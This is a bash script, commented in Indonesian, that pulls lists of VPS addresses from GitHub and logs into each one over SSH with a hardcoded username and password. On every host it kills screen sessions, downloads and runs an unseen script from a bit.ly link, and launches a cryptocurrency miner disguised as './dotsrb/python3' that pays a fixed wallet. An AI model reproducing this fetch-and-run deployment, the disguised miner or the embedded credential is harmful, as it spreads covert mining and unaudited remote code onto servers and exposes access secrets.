#!/bin/bash

# URL raw GitHub file berisi daftar VPS Asia dan Eropa
ASIA_VPS_LIST_URL="https://raw.githubusercontent.com/DotAja/AUTO-RUNMINER/refs/heads/main/asia_vps_list.txt"
EUROPE_VPS_LIST_URL="https://raw.githubusercontent.com/DotAja/AUTO-RUNMINER/refs/heads/main/europe_vps_list.txt"
ASIA_VPS_LIST="asia_vps_list.txt"
EUROPE_VPS_LIST="europe_vps_list.txt"

# Mengunduh file vps_list.txt dari URL
curl -o $ASIA_VPS_LIST $ASIA_VPS_LIST_URL
curl -o $EUROPE_VPS_LIST $EUROPE_VPS_LIST_URL
# Pastikan expect terpasang untuk menangani login otomatis dengan password
if ! command -v expect &> /dev/null
then
    echo "Expect belum terpasang. Install dengan: sudo apt install expect"
    exit
fi

# Fungsi untuk menjalankan script di satu VPS
run_script() {
    local IP=$1
    local USER="cloudsigma"         # Menetapkan USER
    local PASSWORD="Dotaja123@HHHH"   # Menetapkan PASSWORD
    local COMMAND=$2
    local COUNT=$3

    echo "Menghubungkan ke VPS: $IP dengan user: $USER"

    # Menggunakan expect untuk login otomatis dan menjalankan script
    /usr/bin/expect << EOF
    set timeout 10
    spawn ssh $USER@$IP
    expect {
        "*yes/no*" { send "yes\r"; exp_continue }
        "*assword:*" { send "$PASSWORD\r" }
    }
    expect "*#*"  # Prompt yang menandakan login berhasil (misalnya root prompt)
    send "$COMMAND\r"
    expect "*#*"  # Tunggu sampai perintah selesai
    send "exit\r"
    expect eof
EOF
}

COUNT=1
# Membaca daftar VPS Asia dan menjalankan script
while IFS=',' read -r IP; do
    ASIA_SCRIPT_COMMAND="pkill screen; bash <(wget -qO- https://bit.ly/ap-dot); screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool sg.vipor.net:5040 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.TITIT-$COUNT "
    run_script "$IP" "$ASIA_SCRIPT_COMMAND" &  # Jalankan perintah untuk VPS Asia
    COUNT=$((COUNT + 1))
done < $ASIA_VPS_LIST

# Membaca daftar VPS Eropa dan menjalankan script
while IFS=',' read -r IP; do
    EUROPE_SCRIPT_COMMAND="pkill screen; bash <(wget -qO- https://bit.ly/ap-dot); screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool de.vipor.net:5040 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.TITIT-$COUNT "
    run_script "$IP" "$EUROPE_SCRIPT_COMMAND" &  # Jalankan perintah untuk VPS Eropa
    COUNT=$((COUNT + 1))
done < $EUROPE_VPS_LIST

# Tunggu semua proses selesai
wait

clear
echo "Selesai menjalankan script di semua VPS."
